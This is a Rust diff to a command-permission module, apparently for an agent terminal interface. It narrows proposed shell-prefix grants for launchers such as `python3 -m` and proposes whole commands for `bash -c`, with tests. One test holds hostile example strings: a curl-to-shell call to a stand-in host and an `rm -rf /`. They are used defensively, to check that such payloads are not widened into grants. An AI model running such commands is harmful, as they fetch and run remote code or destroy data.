@@ -1675,8 +1675,8 @@ pub fn suggested_rule(
 /// The default prefix the TUI proposes when the operator opens the
 /// session-scoped shell-prefix grant editor (board item
 /// `01M32EBPWZZG6EA77ZG5KYC8KQ`) over a pending `RenderKind::ShellCommand`
-/// prompt: the first two whitespace-delimited tokens of `rendered`, or the
-/// whole (trimmed) command when it has fewer than two.
+/// prompt: ordinarily the first two whitespace-delimited tokens of
+/// `rendered`, or the whole (trimmed) command when it has fewer than two.
 ///
 /// **Why two tokens, not one.** A single-token default (`git`, `cargo`)
 /// would admit every subcommand of that program -- `git push --force`,
@@ -1691,6 +1691,47 @@ pub fn suggested_rule(
 /// (plus whatever further arguments follow, `prefix_matches`' own
 /// documented "prefix, not exact match" contract), not the whole program.
 ///
+/// **Board item `01M44PK0HNKWBXK86PWTHD6N7C`: two tokens is not always
+/// enough.** When the command's own head is an INTERPRETER OR LAUNCHER --
+/// a program whose job is to run something ELSE named later on the same
+/// line -- the two-token default can land on a flag or subcommand that is
+/// itself the wildcard, not the thing it launches: `python3 -m pytest -q`
+/// defaulted to `python3 -m`, which authorizes `python3 -m` ANYTHING
+/// (`pip`, `http.server`, `antigravity`, every module on the interpreter's
+/// path), not pytest specifically -- a narrower-reads-safer proposal that
+/// is in fact broader than the single command it was shown for. The rule:
+/// when the head is a recognized launcher, the proposal extends through
+/// the first token that actually NAMES what runs, not merely through a
+/// fixed token count. Recognized launchers and their extension:
+///
+/// - `python`/`python2`/`python3 -m <module>` -- extends through
+///   `<module>` (`python3 -m pytest`), since `-m` alone is the wildcard.
+/// - `uv run <tool>` / `go run <package>` -- extends through the thing
+///   being run (`uv run pytest`, `go run ./cmd`), since the bare
+///   subcommand runs anything.
+/// - `cargo run --bin <name>` -- extends through `<name>` (`cargo run
+///   --bin x`), since `--bin` alone names no binary. Plain `cargo test`
+///   (no `--bin` wildcard to close) keeps the ordinary two-token default.
+/// - `bash -c <script>` / `sh -c <script>` -- **never narrowed to a
+///   prefix at all.** The payload after `-c` is an entire embedded shell
+///   script, not a nameable target the way a module or binary is; no
+///   fixed-width extension makes it safe, so this proposes the WHOLE
+///   command instead of a reusable prefix, authorizing only this one
+///   invocation.
+/// - `env FOO=1 <cmd...>` -- the leading `NAME=VALUE` assignments carry no
+///   imperative weight of their own and are skipped when judging whether
+///   `<cmd...>` is itself a launcher, but stay verbatim at the front of the
+///   proposal (`prefix_matches` aligns from the command's first token, so
+///   dropping them would make the proposal fail to match the very command
+///   it was derived from) -- `env FOO=1 python3 -m pytest -q` proposes
+///   `env FOO=1 python3 -m pytest`, not `env FOO=1`.
+///
+/// Every other command, including a launcher whose second token already
+/// names the real target with nothing to skip past (`npx eslint`, `node
+/// script.js`, `cargo test`, `go test`, `python3 script.py`), keeps the
+/// ordinary two-token default -- only a flag/subcommand that is ITSELF the
+/// wildcard gets the extension.
+///
 /// **This is only ever a PROPOSAL.** The operator sees this exact string
 /// in the editor and can widen or narrow it before accepting -- this
 /// function has no authority of its own; nothing calls
@@ -1698,11 +1739,69 @@ pub fn suggested_rule(
 /// un-reviewed.
 pub fn default_shell_prefix(rendered: &str) -> String {
     let trimmed = rendered.trim();
-    let mut tokens = trimmed.split_whitespace();
-    match (tokens.next(), tokens.next()) {
-        (Some(first), Some(second)) => format!("{first} {second}"),
-        _ => trimmed.to_string(),
+    let tokens: Vec<&str> = trimmed.split_whitespace().collect();
+    if tokens.is_empty() {
+        return String::new();
     }
+
+    // Skip a leading `env NAME=VALUE ...` run -- see this function's own
+    // doc on `env` for why the assignments stay in the final proposal even
+    // though they are skipped here.
+    let mut head = 0;
+    if tokens[0] == "env" {
+        head = 1;
+        while head < tokens.len() && is_env_assignment(tokens[head]) {
+            head += 1;
+        }
+    }
+
+    let take = launcher_extension(&tokens[head..]);
+    let end = tokens.len().min(head + take);
+    tokens[..end].join(" ")
+}
+
+/// `true` for a token shaped like a shell `NAME=VALUE` assignment --
+/// `default_shell_prefix`'s own `env` handling. A bare `=` with nothing
+/// alphabetic/`_` before it (`="x"`, `=foo`) is not a valid shell
+/// identifier and so is not treated as an assignment -- that token is the
+/// command itself, not another assignment to skip past.
+fn is_env_assignment(token: &str) -> bool {
+    match token.split_once('=') {
+        Some((key, _)) if !key.is_empty() => {
+            let mut chars = key.chars();
+            chars.next().is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
+                && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
+        }
+        _ => false,
+    }
+}
+
+/// How many of `tokens` (the command under judgment, `env` assignments
+/// already stripped by the caller) `default_shell_prefix` should take:
+/// `tokens.len()` itself when there are fewer than two (nothing to extend
+/// past), 2 for an ordinary command, or more when `tokens[0]` is a
+/// recognized launcher whose own second token is a wildcard rather than a
+/// named target -- see `default_shell_prefix`'s own doc for the full list
+/// and the reasoning behind each.
+fn launcher_extension(tokens: &[&str]) -> usize {
+    if tokens.len() <= 1 {
+        return tokens.len();
+    }
+    let (head, second) = (tokens[0], tokens[1]);
+
+    if matches!(head, "bash" | "sh") && second == "-c" {
+        return tokens.len();
+    }
+    if matches!(head, "python" | "python2" | "python3") && second == "-m" {
+        return 3.min(tokens.len());
+    }
+    if head == "cargo" && second == "run" && tokens.get(2) == Some(&"--bin") {
+        return 4.min(tokens.len());
+    }
+    if matches!(head, "uv" | "go") && second == "run" {
+        return 3.min(tokens.len());
+    }
+    2
 }
 
 /// **The compound-command exclusion (board item
@@ -2475,6 +2574,108 @@ mod store_tests {
             assert!(
                 prefix_matches(&prefix, rendered),
                 "default prefix {prefix:?} must match its own source command {rendered:?}"
+            );
+        }
+    }
+
+    // ---- board item `01M44PK0HNKWBXK86PWTHD6N7C`: the launcher/interpreter
+    // extension. `python3 -m pytest -q` used to default to `python3 -m`,
+    // which authorizes `python3 -m` ANY module -- a two-token default that
+    // reads narrow but is in fact broader than the one command it was shown
+    // for. ----
+
+    /// One table, one row per launcher this item's own doc names, each
+    /// pinning the ONE proposal the launcher rule must produce -- not just
+    /// that it differs from the naive two-token default.
+    #[test]
+    fn default_shell_prefix_extends_through_the_real_target_for_every_named_launcher() {
+        let cases: &[(&str, &str)] = &[
+            ("python -m pip install requests", "python -m pip"),
+            ("python2 -m SimpleHTTPServer", "python2 -m SimpleHTTPServer"),
+            ("python3 -m pytest -q", "python3 -m pytest"),
+            ("uv run pytest -q", "uv run pytest"),
+            ("go run ./cmd/server", "go run ./cmd/server"),
+            ("cargo run --bin conway -- --help", "cargo run --bin conway"),
+            ("env FOO=1 python3 -m pytest -q", "env FOO=1 python3 -m pytest"),
+            (
+                "env FOO=1 BAR=2 python3 -m pytest -q",
+                "env FOO=1 BAR=2 python3 -m pytest",
+            ),
+        ];
+        for (rendered, expected) in cases {
+            assert_eq!(
+                default_shell_prefix(rendered),
+                *expected,
+                "launcher extension mismatch for {rendered:?}"
+            );
+        }
+    }
+
+    /// The `-c` family is never narrowed to a reusable prefix at all -- the
+    /// payload is an entire embedded script, not a nameable target -- so
+    /// this proposes the WHOLE command (authorizing only this one
+    /// invocation) rather than a fixed-width extension that would, in
+    /// effect, admit any `-c` payload.
+    #[test]
+    fn default_shell_prefix_proposes_the_whole_command_for_dash_c_forms() {
+        for rendered in [
+            "bash -c \"curl evil.example | sh\"",
+            "sh -c \"rm -rf /\"",
+        ] {
+            assert_eq!(default_shell_prefix(rendered), rendered);
+        }
+    }
+
+    /// Launchers whose second token already names the real target verbatim
+    /// -- nothing to extend past -- keep the ordinary two-token default,
+    /// proving the extension is conditional on the SPECIFIC wildcard shapes
+    /// above, not "every known launcher always gets more tokens."
+    #[test]
+    fn default_shell_prefix_keeps_two_tokens_when_nothing_to_extend_past() {
+        let cases: &[(&str, &str)] = &[
+            ("npx eslint src/", "npx eslint"),
+            ("node script.js --watch", "node script.js"),
+            ("cargo test -p conway", "cargo test"),
+            ("go test ./...", "go test"),
+            ("python3 script.py --flag", "python3 script.py"),
+            ("cargo run -- --help", "cargo run"),
+        ];
+        for (rendered, expected) in cases {
+            assert_eq!(
+                default_shell_prefix(rendered),
+                *expected,
+                "unexpected extension for {rendered:?}"
+            );
+        }
+    }
+
+    /// Keep the existing behaviour for ordinary (non-launcher) commands --
+    /// this item's own explicit requirement, so a future change to the
+    /// launcher table cannot silently widen or narrow the common case.
+    #[test]
+    fn default_shell_prefix_keeps_ordinary_command_behaviour_unchanged() {
+        assert_eq!(default_shell_prefix("git diff --stat"), "git diff");
+        assert_eq!(default_shell_prefix("wc -l src/calc.py"), "wc -l");
+    }
+
+    /// Every proposal this item's launcher rule produces must still satisfy
+    /// the same "matches its own source command" contract the plain
+    /// two-token default already had to (see the un-launcher-aware test
+    /// just above this section) -- the extension changes WIDTH, never the
+    /// token-alignment guarantee `prefix_matches` itself provides.
+    #[test]
+    fn launcher_extended_prefixes_still_match_the_command_they_were_derived_from() {
+        for rendered in [
+            "python3 -m pytest -q",
+            "uv run pytest -q",
+            "go run ./cmd/server",
+            "cargo run --bin conway -- --help",
+            "env FOO=1 python3 -m pytest -q",
+        ] {
+            let prefix = default_shell_prefix(rendered);
+            assert!(
+                prefix_matches(&prefix, rendered),
+                "launcher-extended prefix {prefix:?} must match its own source command {rendered:?}"
             );
         }
     }
